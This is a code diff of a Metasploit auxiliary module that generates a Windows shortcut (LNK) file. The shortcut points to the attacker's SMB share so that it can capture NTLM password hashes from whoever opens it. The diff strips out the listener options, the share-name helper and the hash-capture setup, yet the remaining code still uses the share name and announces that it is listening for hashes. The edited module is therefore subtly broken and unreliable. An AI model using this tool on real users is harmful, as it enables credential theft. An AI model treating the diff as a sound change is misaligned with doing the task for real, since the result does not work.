@@ -2,6 +2,7 @@
 # This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
+require 'faker'
 
 class MetasploitModule < Msf::Auxiliary
   Rank = GoodRanking
@@ -49,11 +50,6 @@ class MetasploitModule < Msf::Auxiliary
       OptString.new('FILENAME', [ true, 'The LNK file name', 'msf.lnk']),
       OptString.new('UNCPATH', [ false, 'UNC path that will be accessed (\\\\server\\share)', nil]),
       OptString.new('APPNAME', [ false, 'Name of the application to display', nil])
-    ])
-    deregister_options('SRVHOST', 'SRVPORT')
-    register_advanced_options([
-      OptAddressLocal.new('SRVHOST', [ true, 'The local host to listen on', '0.0.0.0' ]),
-      OptPort.new('SRVPORT', [ true, 'The local port to listen on', 445 ])
     ])
   end
 
@@ -159,17 +155,12 @@ class MetasploitModule < Msf::Auxiliary
   def run
     app_name = datastore['APPNAME']
     while app_name && !app_name.empty?
-      require 'faker'
       app_name = Faker::App.name
       app_name ||= 'Application'
     end
 
     unc_path = datastore['UNCPATH']
     if unc_path.nil? || unc_path.empty?
-      self.share_name = random_share_name
-      self.smb_srvhost = datastore['SRVHOST']
-      self.smb_srvport = datastore['SRVPORT']
-      self.capture_hashes = true
       start_service
       unc_path = "\\\\#{datastore['SRVHOST']}\\#{share_name}"
     else
@@ -182,10 +173,6 @@ class MetasploitModule < Msf::Auxiliary
     file_create(lnk_data)
     print_good("LNK file created: #{datastore['FILENAME']}")
     print_status("Listening for hashes on #{datastore['SRVHOST']}:#{datastore['SRVPORT']}")
-  end
-
-  def random_share_name
-    "share#{Rex::Text.rand_text_alphanumeric(6)}"
   end
 
 end
